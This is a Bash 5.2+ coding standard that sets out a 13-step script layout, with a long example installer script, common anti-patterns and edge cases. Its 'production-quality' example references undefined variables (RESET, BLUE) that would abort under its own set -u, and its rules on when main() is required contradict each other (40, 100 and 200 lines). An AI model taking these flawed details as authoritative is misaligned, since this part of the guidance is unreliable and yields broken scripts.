# Bash Coding Standard

Comprehensive Bash coding standard for Bash 5.2+ (not a compatibility standard).

"This isn't just a coding standard -- it's a systems engineering philosophy applied to Bash." -- Biksu Okusi

## Coding Principles
- K.I.S.S.
- "The best process is no process"
- "Everything should be made as simple as possible, but not simpler."

**NOTE:** Do not over-engineer scripts; remove unused functions and variables.

## Contents
1. [Script Structure & Layout](#script-structure--layout)
2. [Variable Declarations & Constants](#variable-declarations--constants)
3. [Variable Expansion & Parameter Substitution](#variable-expansion--parameter-substitution)
4. [Quoting & String Literals](#quoting--string-literals)
5. [Arrays](#arrays)
6. [Functions](#functions)
7. [Control Flow](#control-flow)
8. [Error Handling](#error-handling)
9. [Input/Output & Messaging](#inputoutput--messaging)
10. [Command-Line Arguments](#command-line-arguments)
11. [File Operations](#file-operations)
12. [Security Considerations](#security-considerations)
13. [Code Style & Best Practices](#code-style--best-practices)
14. [Advanced Patterns](#advanced-patterns)

BSC00


---


**Rule: BCS0100**

# Script Structure & Layout

This section defines the mandatory 13-step structural layout ensuring consistency, maintainability, and safe initialization. Covers organization from shebang through `#fin` marker, including metadata, shopt settings, dual-purpose patterns, FHS compliance, file extensions, and bottom-up function organization where low-level utilities precede high-level orchestration.


---


**Rule: BCS010101**

### Complete Working Example

Production-quality installation script demonstrating all 13 mandatory BCS0101 layout steps.

---

## Complete Example: All 13 Steps

```bash
#!/bin/bash
#shellcheck disable=SC2034  # Some variables used by sourcing scripts
# Configurable installation script with dry-run mode and validation
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='2.1.420'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Configuration (modifiable by arguments)
declare -- PREFIX='/usr/local' APP_NAME='myapp' SYSTEM_USER='myapp'

# Derived paths (updated when PREFIX changes)
declare -- BIN_DIR="$PREFIX/bin" LIB_DIR="$PREFIX/lib" SHARE_DIR="$PREFIX/share"
declare -- CONFIG_DIR="/etc/$APP_NAME" LOG_DIR="/var/log/$APP_NAME"

# Runtime flags
declare -i DRY_RUN=0 FORCE=0 INSTALL_SYSTEMD=0 VERBOSE=1

# Accumulation arrays
declare -a WARNINGS=() INSTALLED_FILES=()

# Color definitions
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD='\033[1m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

# Utility functions
_msg() {
  local -- status="${FUNCNAME[1]}" prefix="$SCRIPT_NAME:" msg
  case "$status" in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

noarg() { (($# > 1)) || die 22 "Option '$1' requires an argument"; }

# Business logic functions
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

usage() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS]

OPTIONS:
  -p, --prefix DIR       Installation prefix (default: /usr/local)
  -u, --user USER        System user for service (default: myapp)
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Overwrite existing files
  -s, --systemd          Install systemd service unit
  -v, --verbose          Enable verbose output
  -h, --help             Display this help message
  -V, --version          Display version information
EOF
}

check_prerequisites() {
  local -i missing=0
  for cmd in install mkdir chmod chown; do
    command -v "$cmd" >/dev/null 2>&1 || { error "Required command not found '$cmd'"; missing=1; }
  done
  ((INSTALL_SYSTEMD)) && ! command -v systemctl >/dev/null 2>&1 && { error 'systemctl not found'; missing=1; }
  ((missing==0)) || die 1 'Missing required commands'
  success 'All prerequisites satisfied'
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ "$PREFIX" =~ [[:space:]] ]] && die 22 'PREFIX cannot contain spaces'
  [[ -n "$APP_NAME" ]] || die 22 'APP_NAME cannot be empty'
  [[ "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || die 22 'Invalid APP_NAME format'
  [[ -n "$SYSTEM_USER" ]] || die 22 'SYSTEM_USER cannot be empty'

  if [[ ! -d "$PREFIX" ]]; then
    ((FORCE)) || yn "Create PREFIX directory '$PREFIX'?" || die 1 'Installation cancelled'
  fi
  success 'Configuration validated'
}

create_directories() {
  for dir in "$BIN_DIR" "$LIB_DIR" "$SHARE_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory '$dir'"
    elif [[ -d "$dir" ]]; then
      vecho "Directory exists '$dir'"
    else
      mkdir -p "$dir" || die 1 "Failed to create directory '$dir'"
      success "Created directory '$dir'"
    fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR/bin" target="$BIN_DIR"
  [[ -d "$source" ]] || die 2 "Source directory not found '$source'"

  ((DRY_RUN)) && { info "[DRY-RUN] Would install binaries from '$source' to '$target'"; return 0; }

  local -- file basename target_file
  local -i count=0

  for file in "$source"/*; do
    [[ -f "$file" ]] || continue
    basename=${file##*/}
    target_file="$target/$basename"

    if [[ -f "$target_file" ]] && ! ((FORCE)); then
      warn "File exists (use --force) '$target_file'"
      continue
    fi

    install -m 755 "$file" "$target_file" || die 1 "Failed to install '$basename'"
    INSTALLED_FILES+=("$target_file")
    count+=1
  done
  success "Installed $count binaries to '$target'"
}

install_libraries() {
  local -- source="$SCRIPT_DIR/lib" target="$LIB_DIR/$APP_NAME"
  [[ -d "$source" ]] || { vecho 'No libraries to install'; return 0; }

  ((DRY_RUN)) && { info "[DRY-RUN] Would install libraries"; return 0; }

  mkdir -p "$target" || die 1 "Failed to create library directory '$target'"
  cp -r "$source"/* "$target"/ || die 1 'Library installation failed'
  chmod -R a+rX "$target"
  success "Installed libraries to '$target'"
}

generate_config() {
  local -- config_file="$CONFIG_DIR"/"$APP_NAME".conf

  ((DRY_RUN)) && { info "[DRY-RUN] Would generate config '$config_file'"; return 0; }

  [[ -f "$config_file" ]] && ! ((FORCE)) && { warn "Config exists (use --force)"; return 0; }

  cat > "$config_file" <<EOT
# $APP_NAME configuration
# Generated by $SCRIPT_NAME v$VERSION on $(date -u +%Y-%m-%d)

[installation]
prefix = $PREFIX
version = $VERSION
install_date = $(date -u +%Y-%m-%dT%H:%M:%SZ)

[paths]
bin_dir = $BIN_DIR
lib_dir = $LIB_DIR
config_dir = $CONFIG_DIR
log_dir = $LOG_DIR

[runtime]
user = $SYSTEM_USER
log_level = INFO
EOT

  chmod 644 "$config_file"
  success "Generated config '$config_file'"
}

install_systemd_unit() {
  ((INSTALL_SYSTEMD)) || return 0
  local -- unit_file="/etc/systemd/system/${APP_NAME}.service"

  ((DRY_RUN)) && { info "[DRY-RUN] Would install systemd unit"; return 0; }

  cat > "$unit_file" <<EOT
[Unit]
Description=$APP_NAME Service
After=network.target

[Service]
Type=simple
User=$SYSTEM_USER
ExecStart=$BIN_DIR/$APP_NAME
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
EOT

  chmod 644 "$unit_file"
  systemctl daemon-reload || warn 'Failed to reload systemd daemon'
  success "Installed systemd unit '$unit_file'"
}

set_permissions() {
  ((DRY_RUN)) && { info '[DRY-RUN] Would set directory permissions'; return 0; }

  if id "$SYSTEM_USER" >/dev/null 2>&1; then
    chown -R "$SYSTEM_USER:$SYSTEM_USER" "$LOG_DIR" 2>/dev/null || \
      warn "Failed to set ownership on '$LOG_DIR'"
  else
    warn "System user '$SYSTEM_USER' does not exist"
  fi
  success 'Permissions configured'
}

show_summary() {
  cat <<EOT

${BOLD}Installation Summary${RESET}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Application:    $APP_NAME
  Version:        $VERSION
  Prefix:         $PREFIX
  System User:    $SYSTEM_USER

  Directories:
    Binaries:     $BIN_DIR
    Libraries:    $LIB_DIR
    Config:       $CONFIG_DIR
    Logs:         $LOG_DIR

  Files Installed: ${#INSTALLED_FILES[@]}
  Warnings:        ${#WARNINGS[@]}

EOT

  if ((${#WARNINGS[@]})); then
    echo "${YELLOW}Warnings:${RESET}"
    for warning in "${WARNINGS[@]}"; do echo "  • $warning"; done
    echo
  fi

  ((DRY_RUN)) && echo "${BLUE}This was a DRY-RUN - no changes were made${RESET}"
}

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -p|--prefix)  noarg "$@"; shift; PREFIX="$1"; update_derived_paths ;;
      -u|--user)    noarg "$@"; shift; SYSTEM_USER="$1" ;;
      -n|--dry-run) DRY_RUN=1 ;;
      -f|--force)   FORCE=1 ;;
      -s|--systemd) INSTALL_SYSTEMD=1 ;;
      -v|--verbose) VERBOSE=1 ;;
      -h|--help)    usage; exit 0 ;;
      -V|--version) echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
      -*)           die 22 "Invalid option '$1' (use --help)" ;;
      *)            die 2  "Unexpected argument '$1'" ;;
    esac
    shift
  done

  # Make configuration readonly after parsing
  readonly -- PREFIX APP_NAME SYSTEM_USER BIN_DIR LIB_DIR SHARE_DIR CONFIG_DIR LOG_DIR
  readonly -i VERBOSE DRY_RUN FORCE INSTALL_SYSTEMD

  # Execute installation workflow
  info "Installing $APP_NAME v$VERSION to '$PREFIX'"
  check_prerequisites
  validate_config
  create_directories
  install_binaries
  install_libraries
  generate_config
  install_systemd_unit
  set_permissions
  show_summary

  if ((DRY_RUN)); then
    info 'Dry-run complete - review and run without --dry-run to install'
  else
    success "Installation of $APP_NAME v$VERSION complete!"
  fi
}

main "$@"

#fin
```

---

## Key Demonstrations

**Structural:** Complete initialization (shebang, shellcheck, strict mode, shopt), metadata all readonly, organized globals (config/flags/arrays), terminal-aware colors, standard messaging functions, argument parsing with short options, progressive readonly.

**Functional:** Dry-run mode (every operation checks flag), force mode (warns on existing files), derived paths pattern (`update_derived_paths()` updates dependents), validation before action, error accumulation, user prompts (`yn()`), systemd integration.

**Production-ready:** Complete help/usage, version info, verbose/quiet modes, config generation, permission management, summary report, graceful error handling, all 13 mandatory steps correctly implemented.

Template for production installation scripts demonstrating BCS principles integration.


---


**Rule: BCS010102**

### Common Layout Anti-Patterns

**Common violations of BCS0101's 13-step layout pattern with corrections.**

---

## Anti-Patterns

###  Wrong: Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash

# Script starts without error handling
VERSION='1.0.0'

# Commands can fail silently
rm -rf /important/data
cp config.txt /etc/
```

**Problem:** Errors not caught, script continues after failures causing silent corruption.

###  Correct: Error Handling First

```bash
#!/usr/bin/env bash

# Installation script with proper safeguards

set -euo pipefail

shopt -s inherit_errexit shift_verbose

VERSION='1.0.0'
# ... rest of script
```

---

###  Wrong: Declaring Variables After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  # Using VERBOSE before it's declared
  ((VERBOSE)) && echo 'Starting...'

  process_files
}

# Variables declared after main()
declare -i VERBOSE=0

main "$@"
#fin
```

**Problem:** Variables referenced before declaration cause "unbound variable" errors with `set -u`.

###  Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

# Declare all globals up front
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Now safe to use
  ((VERBOSE)) && echo 'Starting...'

  process_files
}

main "$@"
#fin
```

---

###  Wrong: Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

# Business logic defined first
process_files() {
  local -- file
  for file in *.txt; do
    # Calling die() which isn't defined yet!
    [[ -f "$file" ]] || die 2 "Not a file '$file'"
    echo "Processing '$file'"
  done
}

# Utilities defined after business logic
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

main() {
  process_files
  : ...
}

main "$@"
#fin
```

**Problem:** `process_files()` calls undefined `die()`. While bash resolves functions at runtime, this violates bottom-up organization and reduces readability.

###  Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

# Utilities first
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Business logic can safely call utilities
process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file '$file'"
    echo "Processing '$file'"
  done
}

main() {
  process_files
}

main "$@"
#fin
```

---

###  Wrong: No `main()` Function in Large Script

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# ... 200 lines of functions ...

# Argument parsing scattered throughout
if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'
  exit 0
fi

# Business logic runs directly
check_prerequisites
validate_config
install_files

echo 'Done'
#fin
```

**Problem:** No clear entry point, scattered argument parsing, can't test script or source individual functions.

###  Correct: Use `main()` for Scripts Over 40 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# ... 200 lines of functions ...

main() {
  # Centralized argument parsing
  while (($#)); do
    case $1 in
      -h|--help) usage; exit 0 ;;
      *) die 22 "Invalid argument '$1'" ;;
    esac
    shift
  done

  # Clear execution flow
  check_prerequisites
  validate_config
  install_files

  success 'Installation complete'
}

main "$@"
#fin
```

---

###  Wrong: Missing End Marker

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

main() {
  echo 'Hello, World!'
}

main "$@"
# File ends without #fin or #end
```

**Problem:** No confirmation file is complete, harder to detect truncation.

###  Correct: Always End With `#fin`

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

main() {
  echo 'Hello, World!'
}

main "$@"
#fin
```

---

###  Wrong: Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
PREFIX='/usr/local'

# Made readonly too early!
readonly -- VERSION PREFIX

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        # This will fail - PREFIX is readonly!
        PREFIX="$1"
        ;;
    esac
    shift
  done
}

main "$@"
#fin
```

**Problem:** Variables needing modification during argument parsing are readonly too early.

###  Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # These never change

declare -- PREFIX='/usr/local'  # Will be modified during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        PREFIX="$1"  # OK - not readonly yet
        ;;
    esac
    shift
  done

  # Now make readonly after parsing complete
  readonly -- PREFIX

  # Rest of logic...
}

main "$@"
#fin
```

---

###  Wrong: Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# Some globals
declare -i VERBOSE=0

# Function in the middle
check_something() {
  echo 'Checking...'
}

# More globals after function
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

main() {
  check_something
}

main "$@"
#fin
```

**Problem:** Scattered globals make it hard to see all state variables at once.

###  Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# All globals in one place
declare -i VERBOSE=0
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

# All functions after globals
check_something() {
  echo 'Checking...'
}

main() {
  check_something
}

main "$@"
#fin
```

---

###  Wrong: Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
# This file is meant to be sourced, but...

set -euo pipefail  # Modifies caller's shell!

die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Runs automatically when sourced!
main "$@"
#fin
```

**Problem:** When sourced, modifies caller's shell settings and runs `main` automatically.

###  Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash
# Only set strict mode when executed (not sourced)

error() { >&2 echo "ERROR: $*"; }

die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Only run main when executed (not sourced)
# Fast exit if sourced
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Now start main script
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # These never change

: ...

main() {
  echo 'Running main'
  : ...
}

main "$@"

#fin
```

---

## Summary

Eight most common BCS0101 violations:

1. **Missing strict mode** - Scripts without `set -euo pipefail` fail silently
2. **Declaration order** - Variables must be declared before use
3. **Function organization** - Utilities must precede business logic
4. **Missing main()** - Scripts >40 lines need structured entry point
5. **Missing end marker** - Scripts must end with `#fin` or `#end`
6. **Premature readonly** - Variables that change must not be readonly until after parsing
7. **Scattered declarations** - All globals must be grouped together
8. **Unprotected sourcing** - Dual-purpose scripts must protect execution code

Proper structure prevents entire classes of bugs through predictable organization.


---


**Rule: BCS010103**

### Edge Cases and Variations

**Special scenarios where the standard 13-step BCS0101 layout may be modified or simplified.**

---

## Edge Cases and Variations

### When to Skip `main()` Function

**Small scripts under 200 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

**Rationale:** The overhead of `main()` isn't justified for trivial scripts.

### Sourced Library Files

**Files meant only to be sourced** can skip execution parts:

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() {
  [[ "$1" =~ ^-?[0-9]+$ ]]
}

is_valid_email() {
  [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]
}

# No main(), no execution - just function definitions
#fin
```

### Scripts With External Configuration

**When sourcing config files**, structure might include:

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}/myapp/config.sh"
declare -- DATA_DIR="${XDG_DATA_HOME:-$HOME/.local/share}/myapp"

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config '$CONFIG_FILE'"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR

# ... rest of script
```

### Platform-Specific Sections

**When handling multiple platforms:**

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM='macos' ;;
  Linux)  PLATFORM='linux' ;;
  *)      PLATFORM='unknown' ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER='brew'
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER='apt'
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform '$PLATFORM'"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD

: ... rest of script
```

### Scripts With Cleanup Requirements

**When trap handlers are needed:**

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT

# ... rest of script uses TEMP_FILES
```

**Trap should be set** after cleanup function is defined but before any code that creates temp files.

---

## When to Deviate from Standard Layout

The 13-step layout is **strongly recommended**, but these edge cases represent legitimate exceptions:

### Simplifications
- **Tiny scripts (<200 lines)** - Skip `main()`, run code directly
- **Library files** - Skip `set -e`, `main()`, script invocation
- **One-off utilities** - May skip color definitions, verbose messaging

### Extensions
- **External configuration** - Add config sourcing between metadata and business logic
- **Platform detection** - Add platform-specific globals after standard globals
- **Cleanup traps** - Add trap setup after utility functions but before business logic
- **Logging setup** - May add log file initialization after metadata
- **Lock files** - Add lock acquisition/release around main execution

### Key Principles

Even when deviating, maintain these principles:

1. **Safety first** - `set -euo pipefail` still comes first (unless library file)
2. **Dependencies before usage** - Bottom-up organization still applies
3. **Clear structure** - Readers should easily understand the flow
4. **Minimal deviation** - Only deviate when there's clear benefit
5. **Document reasons** - Comment why you're deviating from standard

### Examples of Inappropriate Deviation

**Don't do this:**
```bash
# ✗ Wrong - arbitrary reordering without reason
#!/usr/bin/env bash

# Functions before set -e
validate_input() { : ... }

set -euo pipefail  # Too late!

# Globals scattered
VERSION='1.0.0'
check_system() { : ... }
declare -- PREFIX='/usr'
```

**Instead:**
```bash
# ✓ Correct - standard order maintained
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
declare -- PREFIX='/usr'

validate_input() { : ... }
check_system() { : ... }
```

---

## Summary

Edge cases exist for legitimate reasons:
- **Simplification** for tiny scripts that don't need full structure
- **Libraries** that shouldn't modify sourcing environment
- **External config** that must override defaults
- **Platform detection** for cross-platform compatibility
- **Cleanup traps** for resource management

Core principles remain:
- Error handling first
- Dependencies before usage
- Clear, predictable structure

Deviate only when necessary, and always maintain the spirit of the standard: **safety, clarity, and maintainability**.


---


**Rule: BCS0101**

## General Layouts for Standard Script

**All Bash scripts must follow a 13-step structural layout ensuring consistency, maintainability, and correctness. Bottom-up organization places low-level utilities before high-level orchestration.**

References: **BCS010101** (complete example), **BCS010102** (anti-patterns), **BCS010103** (edge cases)

---

## Rationale

1. **Predictability** - Components in expected locations (metadata step 6, utilities step 9, business logic step 10, main step 11)
2. **Safe Initialization** - Infrastructure established before use: error handling before commands, metadata before functions, globals before references
3. **Bottom-Up Dependency** - Lower-level components defined first. Each function safely calls previously defined functions
4. **Testing/Maintenance** - Source scripts to test functions, extract utilities, understand code quickly
5. **Error Prevention** - Ordering prevents undefined functions, uninitialized variables, premature logic execution
6. **Documentation Through Structure** - Layout documents organization: infrastructure (1-8) → implementation (9-10) → orchestration (11-12)
7. **Production Readiness** - Version tracking, error handling, terminal detection, argument validation, clear flow

---

## The 13 Mandatory Steps

### Step 1: Shebang

```bash
#!/bin/bash
#!/usr/bin/bash
#!/usr/bin/env bash
```

`env` approach: portable, respects PATH. For dual-purpose scripts, shebang can indicate executable section start.

### Step 2: ShellCheck Directives (if needed)

```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
#shellcheck disable=SC1091  # Don't follow sourced files
```

Always include explanatory comments. Use only when necessary.

### Step 3: Brief Description Comment

```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

### Step 4: `set -euo pipefail`

**Mandatory - MUST precede all commands:**

```bash
set -euo pipefail
```

- `set -e` - Exit on command failure
- `set -u` - Exit on undefined variable
- `set -o pipefail` - Pipelines fail if any command fails

**Optional Bash >= 5 test:**
```bash
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; }
```

### Step 5: `shopt` Settings

```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```

- `inherit_errexit` - Subshells inherit `set -e`
- `shift_verbose` - Catch argument parsing bugs
- `extglob` - Extended pattern matching
- `nullglob` - Empty globs expand to nothing

### Step 6: Script Metadata

```bash
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Alternative:** `$(realpath -- "$0")`

**Namespace-locked:**
```bash
[[ -v ALX_VERSION ]] || {
  declare -xr ALX_VERSION='1.0.0'
  #shellcheck disable=SC2155
  declare -xr ALX_PATH=$(realpath -- "${BASH_SOURCE[0]}")
  declare -xr ALX_DIR=${ALX_PATH%/*} ALX_NAME=${ALX_PATH##*/}
}
```

**Note:** SC2155 safely ignored with `realpath`. May be builtin (10x faster).

### Step 7: Global Variable Declarations

```bash
# Configuration
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

# Runtime state
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0

# Arrays
declare -a INPUT_FILES=()
declare -a WARNINGS=()
```

**Types:** `declare -i` (integers), `declare --` (strings), `declare -a` (indexed), `declare -A` (associative)

### Step 8: Color Definitions (if terminal output)

**Preferred:**
```bash
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Alternative (tput):**
```bash
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1; then
  RED=$(tput setaf 1)
  GREEN=$(tput setaf 2)
  RESET=$(tput sgr0)
  readonly -- RED GREEN RESET
else
  declare -r RED='' GREEN='' RESET=''
fi
```

### Step 9: Utility Functions

```bash
declare -i VERBOSE=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

**Simplified (no colors):**
```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
```

Remove unused functions in production.

### Step 10: Business Logic Functions

```bash
check_prerequisites() {
  local -i missing=0
  local -- cmd

  for cmd in git make gcc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found '$cmd'"
      missing+=1
    fi
  done

  ((missing==0)) || die 1 "Missing $missing required commands"
  success 'All prerequisites satisfied'
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ -d "$PREFIX" ]] || die 2 "PREFIX directory does not exist '$PREFIX'"
  success 'Configuration validated'
}

install_files() {
  local -- source_dir=$1 target_dir=$2

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install from '$source_dir' to '$target_dir'"
    return 0
  fi

  [[ -d "$source_dir" ]] || die 2 "Source not found '$source_dir'"
  mkdir -p "$target_dir" || die 1 "Cannot create '$target_dir'"
  cp -r "$source_dir"/* "$target_dir"/ || die 1 'Installation failed'
  success "Installed to '$target_dir'"
}
```

Organize low-level first (validation, file ops), then higher-level (orchestration).

### Step 11: `main()` Function and Argument Parsing

**Required for scripts >200 lines:**

```bash
main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift; PREFIX="$1" ;;
      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;
      -V|--version)  echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
      -h|--help)     usage; exit 0 ;;

      -[pvqnfVh]*) #shellcheck disable=SC2046
                   set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)          die 22 "Invalid option: $1" ;;
      *)           INPUT_FILES+=("$1") ;;
    esac
    shift
  done

  # Make readonly after parsing
  readonly -- PREFIX CONFIG_FILE
  readonly -i VERBOSE DRY_RUN FORCE

  # Execute workflow
  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled'

  check_prerequisites
  validate_config
  install_files "$SCRIPT_DIR"/data "$PREFIX"/share

  success 'Installation complete'
}
```

**Why:** Testing (source and test), organization (single entry), scoping (local parsing vars), debugging (hooks)

**Exception:** Scripts <100 lines can skip `main()`.

### Step 12: Script Invocation

```bash
main "$@"
```

Always quote `"$@"`. For scripts without `main()`, write business logic here.

### Step 13: End Marker

```bash
#fin
```

Or `#end`. Confirms completeness (not truncated), tool compatibility, consistency.

---

## Anti-Patterns

See **BCS010102**:
1. Missing `set -euo pipefail`
2. Variables used before declaration
3. Business logic before utilities
4. No `main()` in large scripts
5. Missing end marker
6. Premature `readonly`
